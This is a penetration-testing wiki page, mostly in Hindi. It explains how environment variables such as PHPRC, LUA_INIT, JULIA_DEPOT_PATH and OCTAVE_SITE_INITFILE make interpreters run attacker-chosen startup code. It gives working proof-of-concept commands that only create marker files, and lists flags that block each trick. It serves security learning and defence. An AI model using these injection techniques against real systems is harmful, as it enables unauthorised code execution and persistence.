# macOS Interpreter Startup-File Injection

{{#include ../../../banners/hacktricks-training.md}}

ये runtime-specific techniques inherited environment variables का उपयोग करके intended script से पहले startup configuration या code चुनती हैं। Lua inline-code variant भी सपोर्ट करता है।

## PHP startup configuration

### `PHPRC` / `PHP_INI_SCAN_DIR` और `auto_prepend_file`

PHP CLI और CGI हर invocation पर configuration पढ़ते हैं। `PHPRC` attacker-readable `php.ini` चुन सकता है, जबकि `PHP_INI_SCAN_DIR` अतिरिक्त `.ini` files के लिए scan की जाने वाली directory को redirect कर सकता है। `auto_prepend_file` directive PHP से requested script से पहले एक file parse करवाती है, इसलिए इस combination से startup code execution संभव हो जाता है।<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

एक विकल्प `.ini` फ़ाइल वाली डायरेक्टरी है:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

`-n` विकल्प `php.ini` को अनदेखा करता है; स्पष्ट रूप से दिया गया trusted `-c` path, `PHPRC` पर प्राथमिकता रखता है। ध्यान रखें कि लंबे समय तक चलने वाला server SAPI आम तौर पर configuration को web server शुरू होने पर पढ़ता है, जबकि CLI और CGI हर invocation पर ऐसा करते हैं।<sup>[[1]](#references)</sup>

## Lua स्टार्टअप कोड

### `LUA_INIT`

कमांड-लाइन विकल्पों या target script को प्रोसेस करने से पहले, standalone Lua interpreter `LUA_INIT_<major>_<minor>` को निष्पादित करता है, या यदि versioned variable मौजूद न हो, तो `LUA_INIT` को। `@` से शुरू होने वाली value किसी file का नाम बताती है; अन्य कोई भी value सीधे Lua code के रूप में evaluate की जाती है। इससे file-backed और fileless, दोनों तरह का startup execution संभव होता है।<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

इंटरप्रेटर के अनुसार सटीक versioned नाम बदलता है, उदाहरण के लिए `LUA_INIT_5_4`। `lua -E` सभी environment variables को अनदेखा करता है, जिनमें startup code और Lua module paths भी शामिल हैं।

## Julia startup depot

### `JULIA_DEPOT_PATH` और `startup.jl`

Julia आम तौर पर स्टार्टअप के समय अपने पहले depot से `config/startup.jl` चलाता है। `JULIA_DEPOT_PATH` depot की सूची नियंत्रित करता है, इसलिए इसे किसी हमलावर द्वारा पढ़े जा सकने वाले tree पर सेट करने से स्वचालित रूप से लोड होने वाली startup फ़ाइल का स्थान बदल जाता है।<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

अंतिम separator उपयोगी है, जब victim को अपने सामान्य packages की ज़रूरत हो। `julia --startup-file=no` इस startup file को disable करता है। Launch से पहले variable को clear करें, क्योंकि यह package registries, environments, caches और code-loading locations को भी नियंत्रित करता है।

## GNU Octave startup files

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave startup के दौरान कई ऐसी files execute करता है जिनमें valid Octave commands होते हैं। `OCTAVE_SITE_INITFILE` site-wide startup file को override करता है और `OCTAVE_VERSION_INITFILE` version-specific startup file को override करता है। इससे इनमें से किसी भी variable को automatic execution किसी ऐसी file पर redirect करने के लिए इस्तेमाल किया जा सकता है जिसे attacker पढ़ सके।<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` केवल `~/.octaverc` जैसी user files को छोड़ता है; यह ऊपर दिए गए site-file override को **नहीं** रोकता। Site files के लिए `--no-site-file` इस्तेमाल करें या सभी startup files को disable करने के लिए `--norc` / `-f` इस्तेमाल करें।<sup>[[7]](#references)</sup>

## References

- [1] [PHP कॉन्फ़िगरेशन फ़ाइल](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 standalone interpreter](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
